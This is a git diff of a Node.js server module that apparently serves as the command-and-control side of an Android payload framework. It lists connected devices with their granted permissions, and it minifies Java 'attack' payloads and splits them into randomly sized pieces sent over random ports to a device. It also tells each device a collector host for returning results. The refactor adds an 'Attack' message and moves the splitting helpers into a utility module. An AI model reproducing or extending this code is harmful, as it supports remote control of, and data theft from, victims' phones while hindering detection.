@@ -1,6 +1,7 @@
 const payloads = require('../database/models/payload');
 const attacks = require('../database/models/attackResult');
 const socketManager = require('./socketManager');
+const codeUtil = require('../utils/codeUtil');
 const secrets = require('../secrets.json');
 
 
@@ -19,7 +20,8 @@ async function showAllDevices() {
                 model: socketInfo.model,
                 api : socketInfo.api,
                 permissions : socketInfo.permissions,
-                permissionsGranted : socketInfo.permissionsGranted
+                permissionsGranted : socketInfo.permissionsGranted,
+                deviceImage : socketInfo.schifo
             });
         });
 
@@ -33,8 +35,8 @@ async function triggerDevice(device, payload_id, payloadArgs) {
         payloads.readOneById(payload_id)
             .then( (payload) => {
                 const javaCode = payload.content;
-                const javaCodeMinified = minifyJavaCode(javaCode);
-                const javaPieces = splitJavaCode(javaCodeMinified);
+                const javaCodeMinified = codeUtil.minifyJavaCode(javaCode);
+                const javaPieces = codeUtil.splitJavaCode(javaCodeMinified);
                 console.log(javaPieces);
 
                 const randomCodeSenderPorts = socketManager.requireFreeCodeSenderPorts(javaPieces.length);
@@ -49,7 +51,8 @@ async function triggerDevice(device, payload_id, payloadArgs) {
 
                 const randomPortCollector = socketManager.requireFreeCollectorPort();
 
-                socketManager.writeOnSocketMainByPort(sourcePort, serversListStringed)
+                socketManager.writeOnSocketMainByPort(sourcePort, "Attack");
+                socketManager.writeOnSocketMainByPort(sourcePort, serversListStringed);
                 socketManager.writeOnSocketMainByPort(sourcePort, 'Collector: ' + HOSTNAME + ':' + randomPortCollector);
                 socketManager.writeOnSocketMainByPort(sourcePort, 'Result Type: ' +  payload.resultType);
                 socketManager.writeOnSocketMainByPort(sourcePort, 'Arg: ' +  payloadArgs);
@@ -98,47 +101,6 @@ async function triggerDevice(device, payload_id, payloadArgs) {
     });
 }
 
-/**
- * Returns javaCode minified, removing tabs and spaces
- * @param javaCode to minify
- * @returns {string} javaCode minified
- */
-function minifyJavaCode(javaCode){
-    const stringEscaped = javaCode.toString().replace(/(\r\n|\n|\r|\t)/gm, '');
-    return stringEscaped.replace(/ +(?= )/g, '');
-}
-
-/**
- * Returns a random subset split of the javaCode
- * @param javaCode to split
- * @returns {[]}
- */
-function splitJavaCode(javaCode) {
-    const stringLength = javaCode.length - 1;
-    let javaPieces = [];
-
-    let i = 0;
-    while(i <= stringLength) {
-        const newIndex = i+getRandomInteger(1, stringLength/6);
-        const substringLenght = newIndex - i  + 1;
-        javaPieces.push(javaCode.substr(i, substringLenght));
-        i = newIndex + 1;
-    }
-
-    return javaPieces;
-}
-
-/**
- * Returns a random integer in range [min;max)
- * @param min inclusive
- * @param max exclusive
- * @returns {number} random integer in range [min;max)
- */
-function getRandomInteger(min, max) {
-    min = Math.ceil(min);
-    max = Math.floor(max);
-    return Math.floor(Math.random() * (max - min)) + min;
-}
 
 
 module.exports = {
